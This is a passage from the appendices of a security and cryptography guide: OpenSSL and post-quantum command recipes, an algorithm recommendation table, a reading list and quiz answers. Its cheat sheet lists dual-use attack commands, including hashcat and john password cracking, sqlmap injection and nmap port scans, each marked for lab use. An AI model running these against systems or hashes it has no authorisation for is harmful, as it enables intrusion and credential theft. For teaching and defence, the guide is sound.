openssl pkeyutl -encap -inkey mlkem.pub -pubin -out ct.bin -secret s.bin   # sender
openssl pkeyutl -decap -inkey mlkem.pem -in ct.bin -secret s.bin           # recipient
# HKDF the raw secret into an AES key -- NEVER use it directly
openssl kdf -keylen 32 -kdfopt digest:SHA256 \
  -kdfopt hexkey:$(xxd -p -c256 shared.bin) \
  -kdfopt hexinfo:$(printf 'app v1' | xxd -p) HKDF
```

### CSRs and certificates

```bash
# self-signed (labs) with SANs
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes \
  -keyout k.pem -out c.pem -days 90 -subj "/CN=shop.securesh.op" \
  -addext "subjectAltName=DNS:shop.securesh.op,DNS:www.securesh.op"

# CSR against an existing key
openssl req -new -key k.pem -subj "/CN=shop.securesh.op" \
  -addext "subjectAltName=DNS:shop.securesh.op" -out req.csr

# sign a CSR with your CA
openssl x509 -req -in req.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -days 90 -sha256 -copy_extensions copy -out leaf.crt

# inspect
openssl x509 -in c.pem -noout -text
openssl x509 -in c.pem -noout -subject -issuer -dates -serial -ext subjectAltName
openssl req  -in req.csr -noout -text -verify

# verify a chain
openssl verify -CAfile root.pem -untrusted intermediates.pem leaf.pem
openssl verify -show_chain -CAfile /etc/ssl/cert.pem leaf.pem

# does this key match this cert?
diff <(openssl x509 -in c.pem -noout -pubkey) <(openssl pkey -in k.pem -pubout) && echo MATCH
```

### Format conversions

```bash
openssl x509 -in c.pem -outform der -out c.der
openssl x509 -in c.der -inform der -out c.pem
openssl pkcs12 -export -in c.pem -inkey k.pem -out bundle.p12          # PEM->PKCS12
openssl pkcs12 -in bundle.p12 -nodes -out all.pem                     # PKCS12->PEM
openssl crl -in list.crl -noout -text
```

### Inspecting live TLS

```bash
openssl s_client -connect host:443 -servername host -brief </dev/null
openssl s_client -connect host:443 -servername host -showcerts </dev/null
openssl s_client -connect host:443 -servername host -msg -state </dev/null
openssl s_client -connect host:443 -tls1_2 </dev/null            # force version
openssl s_client -connect host:443 -groups X25519MLKEM768 </dev/null
openssl s_client -connect host:443 -status </dev/null | grep -A5 OCSP
openssl s_client -connect smtp:587 -starttls smtp </dev/null
openssl s_client -connect host:443 -cert client.crt -key client.key </dev/null   # mTLS
openssl s_time -connect host:443 -new -time 5                    # handshake rate
```

### Local test server

```bash
openssl s_server -accept 8443 -cert c.pem -key k.pem -tls1_3 -www
openssl s_server -accept 8443 -cert c.pem -key k.pem -CAfile ca.crt -Verify 1 -www  # require client cert
```

### Decoding errors

```bash
openssl errstr 0A000086
openssl version -a
openssl list -providers
openssl list -cipher-algorithms
openssl list -kem-algorithms          # 3.5+: look for ML-KEM
openssl list -signature-algorithms
```

---

# Appendix C — Command cheat sheet

### Hashing / checksums

```bash
sha256sum file             shasum -a 256 file          # verify downloads
b3sum file                                             # BLAKE3 (fast)
printf 's' | sha256sum
```

### Passwords / hashes (cracking — your own hashes / lab only)

```bash
hashcat -m 0     hash.txt wordlist        # MD5
hashcat -m 1400  hash.txt wordlist        # SHA-256
hashcat -m 3200  hash.txt wordlist        # bcrypt
hashcat -m 16500 jwt.txt  wordlist        # JWT HS256
john --wordlist=rockyou.txt hash.txt
john --show hash.txt
```

### TLS testing

```bash
testssl.sh https://host                    # or: docker run --rm drwetter/testssl.sh
sslyze host:443
nmap --script ssl-enum-ciphers,ssl-cert -p 443 host
curl -v --tlsv1.3 https://host
curl --cacert ca.pem --cert c.pem --key k.pem https://api
```

### SSH

```bash
ssh-keygen -t ed25519 -C "you@host"                    # generate
ssh-keygen -lf key.pub                                 # fingerprint
ssh-keygen -lvf key.pub                                # + randomart
ssh -Q kex; ssh -Q cipher; ssh -Q key                  # what's supported
ssh -G host                                            # effective client config
ssh -vvv host                                          # debug
ssh -J bastion target                                  # jump (NOT -A)
ssh -L 5433:db.internal:5432 bastion                   # local forward
ssh -R 8080:localhost:3000 host                        # remote forward
ssh -D 1080 bastion                                    # SOCKS proxy
ssh-keygen -Y sign -f key -n file f                    # sign a file
ssh-keygen -Y verify -f allowed_signers -I id -n file -s f.sig < f
ssh-keygen -s ca -I name -n principals -V +8h key.pub  # issue an SSH cert
ssh-keygen -Lf cert.pub                                # inspect a cert
sudo sshd -t         # validate config      sudo sshd -T   # dump effective config
ssh-audit host                                         # grade config
```

### Network capture / scan

```bash
sudo tcpdump -i any -n 'tcp port 443'
sudo tcpdump -i any -nA 'tcp port 80'                  # plaintext payloads
sudo tcpdump -i any -w cap.pcap 'host 10.0.0.5'
tshark -r cap.pcap -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.uri
tshark -r cap.pcap -o tls.keylog_file:keys.log -Y http2      # decrypt own TLS
SSLKEYLOGFILE=keys.log curl -s https://host -o /dev/null
nmap -sn 10.0.0.0/24                                   # host discovery
nmap -sS -sV -sC -p- 10.0.0.5                          # full TCP + versions + scripts
nmap -sU --top-ports 50 10.0.0.5
```

### DNS

```bash
dig +trace name                    dig +dnssec name    dig DS name
dig +short CAA domain               dig TXT _dmarc.domain
delv name                          # DNSSEC-validating lookup
kdig -d @1.1.1.1 +tls name          # DoT
curl -s -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=host&type=A'
```

### Web app testing

```bash
# proxy: Burp Suite / OWASP ZAP  (the core tool)
ffuf -w words.txt -u https://host/FUZZ                 # content discovery
feroxbuster -u https://host                            # recursive
nuclei -u https://host                                 # templated checks
sqlmap -u 'https://host/x?id=1' --batch                # SQLi (LAB ONLY)
katana -u https://host                                 # crawl
httpx -l hosts.txt -sc -title -tech-detect
curl -sI https://host | grep -iE 'strict-transport|content-security|x-frame|x-content-type'
```

### Supply chain

```bash
syft dir:. -o cyclonedx-json > sbom.json
grype sbom:sbom.json
osv-scanner -r .
trivy fs --scanners vuln,secret,misconfig .
npm audit --audit-level=high     pip-audit     cargo audit
cosign sign --key k image        cosign verify --key k.pub image
gitleaks detect --source .       trufflehog git file://.
```

### Secrets / crypto helpers

```bash
age-keygen -o key.txt            age -r <recipient> -o f.age f      age -d -i key.txt f.age
vault kv put secret/app k=v      vault kv get secret/app
openssl rand -base64 24                                # a decent random password
```

---

# Appendix D — What to use in 2026 (algorithm reference)

Defaults for new systems. When in doubt, use the **bold** option and move on —
agonising over choices in this table is rarely where your risk is.

### Symmetric encryption

| Need | Use | Avoid |
|---|---|---|
| General encryption | **AES-256-GCM** or **ChaCha20-Poly1305** (AEAD) | ECB (ever), unauthenticated CBC/CTR, `openssl enc` for anything serious |
| No AES hardware (mobile/embedded) | **ChaCha20-Poly1305** | AES-CBC software |
| Nervous about nonce management | **XChaCha20-Poly1305** (192-bit nonce) | reusing a 96-bit nonce |
| Disk encryption | AES-XTS (via LUKS/FileVault/BitLocker) | rolling your own |
| File encryption tool | **`age`** | GPG for new designs, `openssl enc` |

### Hashing

| Need | Use | Avoid |
|---|---|---|
| General hashing, integrity, signatures | **SHA-256** (or SHA-512 / SHA-384 for margin) | **MD5, SHA-1** (broken) |
| Very high throughput | BLAKE3 | — |
| Keyed integrity between two parties | **HMAC-SHA-256** | `hash(secret‖msg)` (length extension) |
| Password / passphrase storage | **Argon2id** (≥19 MiB, t≥2); scrypt or bcrypt acceptable | SHA-*/MD5, plain or salted; "encryption" |
| Post-quantum margin for hashes | SHA-384 / SHA-512 | truncating below 256-bit output |

### Key exchange

| Need | Use | Avoid |
|---|---|---|
| TLS / general | **X25519**; **X25519MLKEM768** (hybrid PQ) where supported | static DH, DH groups < 2048-bit, RSA key transport |
| SSH | **mlkem768x25519-sha256** or **sntrup761x25519-sha512** | `diffie-hellman-group1`, `group14-sha1` |
| Constrained interop | P-256 (secp256r1) | P-192, custom curves |

### Signatures

| Need | Use | Avoid |
|---|---|---|
| General / new systems | **Ed25519** | DSA, ECDSA without RFC 6979, RSA PKCS#1 v1.5 for new designs |
| Interop with existing PKI | ECDSA **P-256** (RFC 6979 / deterministic), or RSA-2048 **PSS** | `ssh-rsa` (SHA-1), RSA-1024 |
| Post-quantum, general | **ML-DSA-65** (hybrid with Ed25519 first) | rolling your own |
| Post-quantum, long-lived verifier (firmware, roots) | **SLH-DSA** (or stateful LMS/XMSS with airtight state mgmt) | ML-DSA where a decade+ of lattice risk matters |
| JWT algorithm | **EdDSA** or **ES256**; `RS256` acceptable | **`none`**; `HS256` with a weak secret; unpinned `alg` |

### Public-key sizes (if you must use RSA)

| RSA | ≈ symmetric strength | Verdict |
|---|---|---|
| 1024 | 80-bit | broken-ish, do not use |
| **2048** | 112-bit | minimum acceptable |
| 3072 | 128-bit | good; = 256-bit ECC |
| 4096 | ~140-bit | fine, slower; common for roots |

### TLS

```
   Protocols:  TLS 1.3 + TLS 1.2 only. Disable 1.1 / 1.0 / SSLv3.
   TLS 1.2 suites: ECDHE + AES-GCM or ChaCha20-Poly1305 ONLY.
   TLS 1.3 suites: the default 5 (prefer AES-256-GCM / ChaCha20-Poly1305).
   Cert:      ECDSA P-256 leaf (RSA-2048 fallback chain only if needed).
   Key exch:  X25519 (+ P-256); add X25519MLKEM768 where supported.
   On:        HSTS (1 year, includeSubDomains), OCSP stapling.
   Off:       0-RTT (unless every early-data path is audited), compression.
   Generate config with: Mozilla SSL Config Generator ("intermediate").
   Verify with: testssl.sh / SSL Labs -> aim for A/A+.
```

### SSH

```
   KexAlgorithms   mlkem768x25519-sha256,sntrup761x25519-sha512@openssh.com,curve25519-sha256
   Ciphers         chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
   MACs            hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
   Keys            ed25519 (or ecdsa-sk/ed25519-sk for humans); rsa-sha2-512 only for legacy
   Auth            publickey only; PasswordAuthentication no; PermitRootLogin no
```

### Passwords / auth

```
   Storage:   Argon2id (verify params against the current OWASP Password
              Storage Cheat Sheet before shipping).
   Policy:    allow long passphrases; screen against Have I Been Pwned;
              NO forced composition rules; NO forced periodic rotation
              (NIST SP 800-63B).
   MFA:       offer TOTP as a baseline; push users toward WebAuthn/passkeys
              (the only phishing-resistant option). SMS = last resort.
   Sessions:  opaque 128-bit IDs server-side by default; rotate on login;
              Secure; HttpOnly; SameSite=Lax|Strict; __Host- prefix.
   OAuth:     Authorization Code + PKCE for ALL clients. Validate state,
              exact redirect_uri, and (OIDC) id_token sig/iss/aud/exp/nonce.
```

### Randomness

```
   Keys / tokens / salts / nonces:  the OS CSPRNG.
     /dev/urandom, getrandom(2), secrets (Python), crypto.randomBytes (Node),
     crypto/rand (Go), SecureRandom (Java), openssl rand.
   NEVER: rand(), Math.random(), mt19937, time/PID seeds, "random enough".
```

---

# Appendix E — Reading list, and how the facts here were checked

### How this guide's technical claims were verified

```
   * Every worked cryptographic example (Base64 padding, hex, MD5/SHA-1/
     SHA-256 digests including the avalanche comparison, toy RSA
     p=61/q=53/e=17/d=2753, toy Diffie-Hellman p=23/g=5, the ECDSA
     k-reuse key recovery, AEAD tamper-detection, RSA-PSS / ECDSA /
     X25519 round trips) was executed and its output confirmed before
     being written down.
   * OpenSSL / ssh-keygen / dig command sequences were run on a real
     system. Where the local build was LibreSSL (macOS) and a command
     needs OpenSSL 3.x or 3.5+, that is called out inline and in Ch 0.4 --
     the commands are written for OpenSSL 3.x.
   * Algorithm parameters (ML-KEM-768: 1184-byte public key, 1088-byte
     ciphertext, 32-byte shared secret; ML-DSA-65: 1952 / 3309 bytes;
     SLH-DSA signature sizes; AES round counts; RSA<->symmetric strength
     equivalences) are from the FIPS 203/204/205 standards and NIST
     SP 800-57 / SP 800-131A.
   * Migration timelines are from NIST IR 8547 (draft), NSA CNSA 2.0, and
     UK NCSC guidance as published at the time of writing (dates in Ch 23,
     25 are absolute).
   * Historical incidents (DigiNotar 2011, Flame 2012, Heartbleed 2014,
     SHAttered 2017, Capital One / SSRF 2019, SolarWinds 2020, Log4Shell
     2021, dependency confusion 2021, xz-utils backdoor 2024) are
     described from the public post-mortems and advisories.
   * OWASP Top 10 category names/numbers follow the 2025 edition; the guide
     stresses that rankings shuffle between editions while the bug classes
     are stable.
```

**If you find an error:** treat the primary source (RFC, FIPS, vendor advisory,
`openssl`/`ssh` on your own up-to-date system) as authoritative over this guide,
and over any single blog post.

### Books

```
   FOUNDATIONS / CRYPTO
     Serious Cryptography, 2nd ed. -- Jean-Philippe Aumasson   (the one to own)
     Real-World Cryptography -- David Wong                     (engineering focus)
     Cryptography Engineering -- Ferguson, Schneier, Kohno
     The Code Book -- Simon Singh                              (accessible history)

   TLS / PKI / NETWORK
     Bulletproof TLS and PKI, 2nd ed. -- Ivan Ristic
     OpenSSL Cookbook -- Ivan Ristic                           (free)
     SSH Mastery, 2nd ed. / DNSSEC Mastery, 2nd ed. -- Michael W. Lucas
     Practical Packet Analysis, 3rd ed. -- Chris Sanders
     The Practice of Network Security Monitoring -- Richard Bejtlich

   WEB / APP SECURITY
     The Web Application Hacker's Handbook, 2nd ed. -- Stuttard & Pinto
     The Tangled Web -- Michal Zalewski
     Real-World Bug Hunting -- Peter Yaworski
     Alice and Bob Learn Application Security -- Tanya Janca
     Designing Secure Software -- Loren Kohnfelder

   DESIGN / OPERATIONS / IR
     Threat Modeling: Designing for Security -- Adam Shostack
     Security Engineering, 3rd ed. -- Ross Anderson            (free PDF; huge)
     Incident Response & Computer Forensics, 3rd ed. -- Luttgens et al.
     Building Secure and Reliable Systems -- Google (SRE)      (free)

   GOING DEEPER
     Practical Malware Analysis -- Sikorski & Honig
     The Hardware Hacking Handbook -- Woudenberg & O'Flynn
     Hacking Kubernetes -- Martin & Hausenblas
```

### Free courses and practice

```
   PortSwigger Web Security Academy   -- the best free web-security training
   Cryptopals (cryptopals.com)         -- learn crypto by breaking it
   CryptoHack (cryptohack.org)         -- gamified crypto challenges
   pwn.college                          -- systems / binary exploitation
   TryHackMe / HackTheBox              -- guided -> unguided, legal labs
   picoCTF                              -- beginner CTF, great archives
   OverTheWire (Bandit -> ...)         -- shell + basics
   flaws.cloud / flaws2.cloud           -- AWS security
   OWASP Juice Shop / WebGoat / DVWA   -- vulnerable apps to run locally
```

### Primary sources worth reading directly

```
   RFC 8446 (TLS 1.3)            -- Section 2 is genuinely readable
   RFC 8439 (ChaCha20-Poly1305)  -- with test vectors
   RFC 4253 / 4252 / 4254 (SSH)  -- the three sub-protocols
   RFC 8555 (ACME)               -- how Let's Encrypt works
   RFC 6749 + RFC 9700 (OAuth 2.0 + Security BCP)
   FIPS 197 (AES), FIPS 203/204/205 (ML-KEM / ML-DSA / SLH-DSA)
   NIST SP 800-63B (authentication), 800-207 (zero trust),
        800-61 (incident handling), 800-57 (key management), IR 8547 (PQC)
   OWASP: Top 10, API Top 10, ASVS, WSTG, and the Cheat Sheet Series
   Saltzer & Schroeder, "The Protection of Information in Computer Systems" (1975)
   Diffie & Hellman, "New Directions in Cryptography" (1976)
```

### Illustrated / interactive explainers

```
   tls13.xargs.org / tls12.xargs.org   -- every byte of a TLS handshake
   howhttps.works                       -- illustrated HTTPS
   badssl.com                           -- broken TLS configs to test clients
   jwt.io                               -- decode JWTs live
   crt.sh                               -- browse Certificate Transparency logs
   dnsviz.net                           -- visualise a domain's DNSSEC chain
   csp-evaluator.withgoogle.com         -- find the holes in a CSP
   canarytokens.org                     -- free tripwire tokens
```

### Staying current (see Ch 58 for the full list)

```
   Blogs:      Project Zero, Trail of Bits, PortSwigger Research,
               Cloudflare / Google / AWS security blogs
   Newsletter: tl;dr sec
   Podcast:    Risky Business
   Advisories: GitHub Advisory DB, OSV.dev, your distro's security list
   Standards:  the IETF WG / NIST project / CA-Browser Forum for areas you
               operate in
```

---

# Appendix F — Answers to "Check yourself"

Brief answers. If yours differs in wording but matches in substance, you're fine.
Page back to the chapter for anything that doesn't click.

### Chapter 1 — What "security" actually means

1. **CIA triad:** Confidentiality (only authorised parties see data), Integrity
   (data isn't altered undetected), Availability (the system is usable when
   needed). Every control serves one or more.
2. They trade off: encrypting everything can hurt availability/performance;
   aggressive lockouts hurt availability; maximum availability (no auth) destroys
   confidentiality. Security is choosing the right balance for the context.
3. **Defence in depth:** layered independent controls so no single failure is
   catastrophic. The 2017 credit-bureau breach chained ~five failures (unpatched
   framework, flat network, no egress filtering, expired traffic-inspection cert,
   plaintext credentials) — any one control working would have blunted it.
4. Because the threat, the value at risk, and the acceptable cost differ per
   system. "Secure" is meaningless without "against whom, protecting what, at
   what cost".

### Chapter 2 — Thinking like an attacker

1. **Attack surface:** every point an attacker can interact with (endpoints,
   inputs, ports, dependencies, people). You reduce it by removing features,
   inputs, and exposure.
2. **Trust boundary:** where data moves between different trust levels or owners
   (internet→app, app→DB, user→server). Threats cluster there because that's
   where assumptions change.
3. Recon → weaponisation/delivery → exploitation → installation/persistence →
   command & control → actions on objectives. Defenders try to break any link.
4. It forces you to enumerate entry points and assets systematically rather than
   guessing, and it shows where one control protects many paths.

### Chapter 3 — The vocabulary

1. **Encoding** is reversible with no key (transport). **Hashing** is one-way, no
   key (fingerprint). **Encryption** is reversible *with* a key (confidentiality).
   Only encryption keeps data secret.
2. **Authentication** = who you are; **authorization** = what you may do. Authn
   comes first; authz is checked on every request.
3. A **threat** is a bad outcome someone wants; a **vulnerability** is a weakness;
   an **exploit** is the technique that turns the vulnerability into the threat;
   **risk** = likelihood × impact.
4. **Fail-closed** denies on error (default for security controls);
   **fail-open** allows on error (sometimes chosen for availability, e.g. a
   badge reader on a fire exit). Choose deliberately per context.

### Chapter 5 — How text becomes bytes

1. ASCII assigns the *character* `'0'` the code 48; the *number* zero is a
   different value. Confusing the two breaks parsing.
2. Character count ≠ byte count (a 10-char name can be 40 bytes), so
   length limits and buffer sizes can disagree → truncation or overflow.
3. Different parsers handle invalid UTF-8 differently (reject / replace / drop),
   so two components can disagree about the same input — the root of many filter
   bypasses.

### Chapter 6 — Base64, hex, URL encoding

1. To carry arbitrary bytes through channels that only accept a limited "safe"
   character set (email, URLs, JSON, terminals).
2. It maps every 3 bytes to 4 characters (6 bits each), so output is 4/3 the
   size.
3. Padding: `=` marks that the final group had only 1 or 2 input bytes (`==` = 1
   byte, `=` = 2 bytes).
4. No — encoding has no integrity protection. Flip a character and it decodes to
   different (or invalid) data with nothing to detect the change.
5. No. A JWT payload is Base64url and readable by anyone; only its *signature*
   provides integrity. Never put secrets in it.

### Chapter 7 — Unicode and normalisation

1. e.g. `é` as U+00E9, or as `e` (U+0065) + combining acute (U+0301). Same
   glyph, different bytes.
2. Because some component may normalise *after* your check (NFKC folds
   full-width `＜` to `<`), turning previously-safe input into an attack. Normalise
   first, then validate.
3. Substituting a visually identical character from another script (Cyrillic `а`
   for Latin `a`) so `раypal.com` looks like `paypal.com` — the basis of IDN
   phishing.
4. You can enumerate exactly what's permitted (`[a-z0-9_-]`); you can't enumerate
   every malicious variation (homoglyphs, invisibles, encodings).

### Chapter 8 — What a hash function is

1. Deterministic, one-way (preimage resistant), avalanche (one bit flips ~half
   the output), collision resistant.
2. Infinitely many possible inputs map to finitely many outputs (2^256 for
   SHA-256), so collisions must exist mathematically; security is that *finding*
   one is infeasible.
3. The birthday bound: finding any collision takes ~2^(n/2) work, so a 256-bit
   output gives 128-bit collision resistance.
4. Low-entropy input: an attacker just hashes every possible card number / email
   / PIN and looks yours up. Hashing only hides high-entropy secrets.

### Chapter 9 — Real hash functions

1. Collision resistance fails: you can find two different inputs with the same
   hash cheaply (MD5 in seconds, SHA-1 with real effort). Preimage resistance
   still holds, but that's not enough.
2. A signature signs the *hash* of a document; if you can craft two documents
   with the same hash, a signature on one is valid for the other — get a benign
   file signed, swap in the malicious one.
3. Given `hash(secret‖msg)` and `len(secret)`, an attacker computes a valid hash
   for `msg‖padding‖extra` without the secret (SHA-1/SHA-2 structure). Fix: use
   **HMAC**, not a different hash.
4. **SHA-256** by default (SHA-512 / SHA-3-256 for margin; BLAKE3 for speed).
   Never MD5 or SHA-1 for security.

### Chapter 10 — Password storage

1. SHA-256 is *fast* — a GPU does billions/sec, so an attacker who steals the
   database cracks most passwords quickly.
2. A **salt** is a random, unique-per-user value stored alongside the hash. It's
   **not secret**. It stops precomputation (rainbow tables) and hides that two
   users share a password.
3. **Memory-hard** = the function needs a lot of RAM per evaluation, which
   defeats GPUs/ASICs whose many small cores can't each get enough memory.
4. **Argon2id** — roughly ≥19 MiB memory, ≥2 iterations, parallelism 1 (verify
   against the current OWASP cheat sheet; tune to ~250–500 ms on your hardware).
5. **Username enumeration:** the app reveals which accounts exist via different
   messages/timing/status for "no such user" vs "wrong password". Prevent it with
   identical responses and timing for both.

### Chapter 11 — HMAC

1. Anyone can recompute a plain hash, so an attacker who changes the message just
   recomputes the hash. It detects accidents, not adversaries.
2. HMAC adds a **secret key**: it proves the message is unchanged *and* came from
   someone holding the key. Both parties must share that key.
3. A **MAC** uses one shared key (either party can make tags, so no third-party
   proof). A **signature** uses a private/public keypair — only the key holder
   can sign, and anyone can verify, giving **non-repudiation**.
4. A byte-by-byte `==` returns early on the first mismatch; timing leaks how many
   leading bytes are correct, letting an attacker forge a tag one byte at a time.
5. When both parties are you (session cookies, internal service auth, webhooks) —
   HMAC is faster and simpler and you don't need third-party verifiability.

### Chapter 12 — Symmetric crypto idea

1. **Kerckhoffs's principle:** the system stays secure even if everything except
   the key is public. "Proprietary/secret" crypto is a warning sign because it
   hasn't survived public scrutiny.
2. The key must be as long as the message; it must be truly random; it must never
   be reused; and it provides no integrity.
3. The key cancels: `C1 XOR C2 = P1 XOR P2`. The attacker gets the XOR of the two
   plaintexts, separable with language statistics.
4. No — encryption gives confidentiality only. Tampering needs a MAC or AEAD.

### Chapter 13 — Block ciphers and AES

1. **128 bits (16 bytes)** — always, for every key size. Only the round count
   changes (10/12/14 for 128/192/256).
2. SubBytes (non-linear substitution), ShiftRows (row shifts), MixColumns
   (column mixing), AddRoundKey (XOR the round key).
3. On hardware without AES acceleration (some phones/embedded), ChaCha20 is
   faster in software and is constant-time by design.
4. PKCS#7 padding always adds bytes so padding can be unambiguously removed; a
   full 16-byte input gets a whole extra block of padding → 32 bytes.

### Chapter 14 — Modes of operation

1. ECB encrypts each block independently, so identical plaintext blocks →
   identical ciphertext blocks; large uniform regions stay visible (the penguin).
2. The IV seeds the chain so identical plaintexts encrypt differently. For CBC it
   must be **unpredictable** (not just unique).
3. The keystream repeats → `C1 XOR C2 = P1 XOR P2` (one-time-pad reuse). Knowing
   one plaintext reveals the other; with GCM it also breaks authentication.
4. ECB and CBC need padding (they operate on whole blocks) → padding-oracle risk.
   CTR and GCM are stream-like and need none.
5. None of ECB/CBC/CTR provide integrity. Only the AEAD modes (GCM,
   ChaCha20-Poly1305) do.

### Chapter 15 — AEAD

1. Confidentiality (encryption) **and** integrity/authenticity (a tag), in one
   operation.
2. **AAD** is data authenticated but not encrypted — e.g. a record ID, version,
   or header. It prevents ciphertext being swapped between contexts.
3. Nothing — an error, and **no plaintext at all**. The tag is checked before any
   plaintext is released.
4. In GCM, nonce reuse also leaks the authentication subkey, letting the attacker
   **forge** arbitrary messages, not just recover plaintext XOR.
5. Without `-pbkdf2 -iter`, OpenSSL derives the key with a single MD5 iteration —
   trivially brute-forced. Those flags enable a slow, salted KDF.

### Chapter 16 — Symmetric with OpenSSL

1. It falls back to one round of MD5 for key derivation — weak and fast to crack.
2. The IV isn't secret, but the receiver needs it to decrypt, so it's stored/sent
   with the ciphertext (typically prepended).
3. Command-line arguments are visible in `ps` output and shell history. Pass keys
   via file, env var, or stdin.
4. `openssl enc` has no way to output/verify the GCM authentication tag, so its
   "GCM" is unauthenticated. Use a real library or `age`.

### Chapter 17 — Key distribution & the big idea

1. Two parties who have never met, communicating over a network an attacker
   watches, need a shared key — but any way to send it exposes it.
2. Encrypt **to** someone with **their public key**; **sign** with **your private
   key**. (Mailbox vs wax seal.)
3. Asymmetric operations are slow and size-limited, so you use them once to
   establish a symmetric key, then do the bulk work with fast AEAD.
4. It doesn't tell you *whose* public key it is — binding a key to an identity
   needs certificates / PKI (or a known SSH host key, a web of trust).

### Chapter 18 — Diffie–Hellman

1. It cannot "un-mix" the exchanged public mixtures to recover either private
   colour, so it can't compute the shared secret.
2. The **discrete logarithm problem** (recover `a` from `g^a mod p`) in a large
   prime field.
3. **Ephemeral** — fresh keys per session, discarded after — which gives forward
   secrecy: stealing a long-term key later doesn't decrypt past sessions.
4. Man-in-the-middle: the attacker does separate exchanges with each side. Fix:
   **authenticate** the DH public values with signatures (certs / host keys).
5. Run it through a **KDF** (HKDF) — raw DH output isn't uniformly random and may
   have structure.

### Chapter 19 — RSA

1. Factoring the product of two large primes.
2. `65537` (0x10001) — small, so encryption/verification is fast; a Fermat prime,
   so it's coprime to φ; large enough to avoid small-exponent attacks.
3. It's deterministic (dictionary/repeat detection) and malleable
   (`c1·c2 mod n` decrypts to `m1·m2`); small messages fall to a plain root.
4. ~190 bytes for RSA-2048 + OAEP-SHA256 — only enough for a symmetric key. RSA
   is a **key-transport** primitive, not a data cipher.
5. **OAEP** for encryption, **PSS** for signatures.
6. No. Shor's algorithm factors any RSA key in polynomial time; size doesn't
   help.

### Chapter 20 — Elliptic curve cryptography

1. A 256-bit ECC key ≈ **RSA-3072** (128-bit security level).
2. The **elliptic-curve discrete logarithm problem** (ECDLP): recover the scalar
   `k` from `Q = k·P`, with no known sub-exponential shortcut.
3. Reusing (or making predictable) the per-signature nonce `k` lets an attacker
   compute the private key from two signatures. Real incident: the **Sony PS3**
   code-signing key extraction (fixed `k`).
4. **Ed25519** derives `k` deterministically from the key and message (like
   RFC 6979), so there's no RNG to fail and no `k` to repeat.
5. **X25519** for key exchange (ECDH), **Ed25519** for signatures.
6. No — Shor breaks ECDLP too, and ECC keys are smaller, so arguably fall first.

### Chapter 21 — Digital signatures

1. **Non-repudiation** — a third party can verify that the private-key holder
   (not the verifier) produced it. It also needs no pre-shared secret.
2. Because the message is large and raw sign operations have exploitable
   structure; you sign a fixed-size hash instead.
3. It breaks the scheme: a hash collision lets a signature on a benign document
   be valid for a malicious one. Real example: **SHA-1** and the SHAttered
   collision → CAs dropped SHA-1.
4. Who the key holder is; when it was signed; that the signer read/meant it; that
   the key isn't stolen or the signer coerced; freshness (replay).
5. Put a nonce/timestamp/expiry *inside* the signed data.

### Chapter 22 — Keys & signatures with OpenSSL

1. **`openssl genpkey`** (and `openssl pkey` for inspection/conversion).
2. Ed25519 hashes the message internally; you sign the raw message with
   `pkeyutl -rawin`, not `dgst`.
3. Run the raw shared secret through a **KDF** (HKDF) to derive actual keys.
4. **Signing** (the private-key op) is the slow direction; verification is fast.
   So TLS clients can cheaply verify a server's cert/signature on every
   connection while the CA signs rarely.

### Chapter 23 — Why quantum breaks public-key crypto

1. **Shor's algorithm**, which runs in polynomial time (period-finding) for
   factoring and discrete logs.
2. Shor scales polynomially, so a bigger modulus only adds a small constant
   factor — RSA-16384 falls about as easily as RSA-2048.
3. Grover halves the effective key strength: AES-256 → ~128-bit effective, still
   infeasible. Not a problem (use AES-256).
4. Record encrypted traffic now, decrypt it once a quantum computer exists. Any
   data that must stay secret past ~2030s needs PQ key exchange **today**.
5. **Key-exchange** migration is more urgent, because HNDL lets past sessions be
   broken retroactively; a signature forged in 2035 can't retro-authenticate a
   2026 handshake.

### Chapter 24 — Post-quantum algorithms

1. **ML-KEM** (FIPS 203, key encapsulation), **ML-DSA** (FIPS 204, signatures),
   **SLH-DSA** (FIPS 205, hash-based signatures).
2. Structured lattice problems (Module-LWE). Shor's period-finding doesn't apply
   to lattice problems; the best known attacks (classical or quantum) are
   exponential.
3. A KEM: the recipient publishes a public key; the sender *encapsulates* →
   `(shared secret, ciphertext)`; the recipient *decapsulates* the ciphertext to
   the same secret. No simultaneous two-way exchange.
4. Public key **1184 B**, ciphertext **1088 B**, shared secret **32 B**.
5. SLH-DSA signatures are 8–50 KB and signing is slow (ms) — too heavy for
   per-connection TLS — but fine for firmware signed rarely and verified
   occasionally, where its hash-only security assumption is worth it.
6. So a break of one mathematical family doesn't break everything — lattices
   (ML-*), hashes (SLH-DSA), and codes (HQC) are independent.

### Chapter 25 — Hybrid and migration

1. A classical exchange (X25519) **and** a PQ KEM (ML-KEM-768), combined through
   a KDF. Secure as long as **either** remains unbroken.
2. Because it *is* both: X25519 plus ML-KEM-768 run together. Naming makes the
   composition explicit.
3. **Crypto-agility:** you can change algorithms without a rewrite. Concretely:
   algorithms in config not code; algorithm+version tags on every stored
   blob/hash/signature; key storage behind an abstraction; ability to run two
   algorithms in parallel during migration; a current crypto inventory.
4. The bootloader has a ~10-year field life and no practical way to update its
   trust anchor later, so it must be right *now*; the JWTs live minutes and can
   migrate on the normal library-upgrade cycle.
5. **Inventory** — you can't migrate crypto you can't see, and you can't
   prioritise without knowing data lifetimes and exposure.

### Chapter 26 — Post-quantum with OpenSSL

1. `openssl pkeyutl -encap` (the sender, using the recipient's public key) and
   `openssl pkeyutl -decap` (the recipient, using their private key).
2. ~**3.3 KB** for ML-DSA-65 vs **64 bytes** for Ed25519.
3. Tiny key, ~8 KB signature, slow signing, fast-ish verify — fine for firmware
   (signed once, verified occasionally, decade-long validity), wrong for
   high-volume TLS handshakes.
4. No — the certificate can stay classical (ECDSA/RSA) for now; only the
   **key-exchange group** changes to `X25519MLKEM768`.
5. The real cost is **bytes on the wire**, not CPU — ML-KEM's operations are as
   fast as or faster than X25519.

### Chapter 27 — What HTTPS guarantees

1. Confidentiality, integrity, and **server** authentication (plus forward
   secrecy in TLS 1.3).
2. Any three of: it doesn't make the server trustworthy; doesn't hide which site
   you visit (DNS + SNI); doesn't protect data before/after the tunnel; doesn't
   authenticate the client by default; doesn't stop app bugs; doesn't hide
   traffic size/timing.
3. The destination IP, the hostname (via DNS and SNI unless ECH), and packet
   sizes/timing.
